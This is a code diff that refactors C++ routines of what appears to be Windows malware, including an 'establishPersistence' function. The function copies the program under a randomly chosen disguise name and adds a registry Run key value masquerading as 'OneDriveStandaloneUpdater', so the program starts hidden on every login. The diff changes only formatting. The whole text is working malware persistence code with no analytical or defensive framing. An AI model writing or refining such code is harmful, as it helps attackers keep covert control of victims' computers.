@@ -35,10 +35,7 @@ std::wstring getExecutablePath() {
 
     do {
         path_buf.resize(path_buf.size() + MAX_PATH);
-        copied = GetModuleFileNameW(
-            nullptr,
-            path_buf.data(),
-            static_cast<DWORD>(path_buf.size()));
+        copied = GetModuleFileNameW(NULL, path_buf.data(), static_cast<DWORD>(path_buf.size()));
     } while (copied >= path_buf.size());
 
     path_buf.resize(copied);
@@ -62,11 +59,7 @@ void establishPersistence() {
 
     std::random_device rd;
     std::mt19937 gen(rd());
-
-    const int nameCount =
-        static_cast<int>(dynamicNames.size());
-
-    std::uniform_int_distribution<int> distrib(0, nameCount - 1);
+    std::uniform_int_distribution<> distrib(0, static_cast<int>(dynamicNames.size() - 1));
     const wchar_t* persistFilename = dynamicNames[distrib(gen)];
 
     const wchar_t* persistDir = isAdmin() ? adminPath : userPath;
@@ -110,25 +103,10 @@ void establishPersistence() {
             CloseHandle(pi.hThread);
         }
     } else {
-        HKEY hKey = nullptr;
-        if (RegOpenKeyExW(
-                HKEY_CURRENT_USER,
-                L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-                0,
-                KEY_SET_VALUE,
-                &hKey) == ERROR_SUCCESS) {
-
-            const DWORD byteSize =
-                static_cast<DWORD>((persistPath.size() + 1) * sizeof(wchar_t));
-
-            RegSetValueExW(
-                hKey,
-                L"OneDriveStandaloneUpdater",
-                0,
-                REG_SZ,
-                reinterpret_cast<const BYTE*>(persistPath.c_str()),
-                byteSize);
-
+        // Use registry run key
+        HKEY hKey;
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            RegSetValueExW(hKey, L"OneDriveStandaloneUpdater", 0, REG_SZ, (const BYTE*)persistPath.c_str(), static_cast<DWORD>((persistPath.size() + 1) * sizeof(wchar_t)));
             RegCloseKey(hKey);
         }
     }
